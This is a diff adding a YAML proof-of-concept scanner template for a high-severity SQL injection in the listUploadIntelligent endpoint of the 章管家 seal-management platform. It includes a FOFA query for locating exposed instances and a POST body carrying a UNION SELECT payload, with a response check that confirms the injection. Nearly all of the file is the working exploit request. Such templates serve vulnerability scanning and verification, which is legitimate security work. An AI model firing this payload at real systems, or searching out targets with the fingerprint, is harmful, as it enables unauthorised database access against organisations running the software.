@@ -1,0 +1,21 @@
+id: poc-yaml-shjysoft-zhangin-listuploadIntelligent-sqli
+info:
+  name: 章管家listUploadIntelligent接口存在sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 印章智慧管理平台
+  fofa: app="章管家-印章智慧管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /app/message/listUploadIntelligent.htm?token=dingtalk_token&person_id=1&unit_id=1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: pageNo=1&pageSize=20&keyWord=&startDate=&endDate=&deptIds=&type_id=&is_read=-1
+    union select md5({{.t1}}),2,3,4,5,6,7,8,9,10,11,12 --
+  expression: "status_code == 200 && \ncontains(body,t2) &&\ncontains(body,\"data\"\
+    ) &&\n!contains(body,\"<\")\n"
+transport: http
